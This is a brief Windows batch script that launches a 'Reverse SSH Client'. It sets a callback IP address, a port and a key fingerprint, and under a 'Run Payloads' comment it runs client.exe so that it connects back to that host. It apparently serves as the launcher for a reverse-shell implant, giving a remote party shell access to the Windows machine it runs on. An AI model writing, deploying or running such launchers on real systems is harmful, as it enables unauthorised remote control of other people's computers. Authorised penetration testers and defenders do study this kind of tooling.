@echo off
rem *******************************************************
rem start_client.bat
rem This Script will start a Reverse SSH Client
rem on Windows Computer
rem
rem *******************************************************
@echo off

rem set Variables

set PORT=3232
set IPADDR=192.168.252.3
set FNGPR=a1b53c80c9aae05b3001e00436a6728f6f3d65e01ecff132757fe665ce7cd7cb

rem Run Payloads

.\client.exe --fingerprint %FNGPR% --foreground -d %IPADDR%:%PORT%
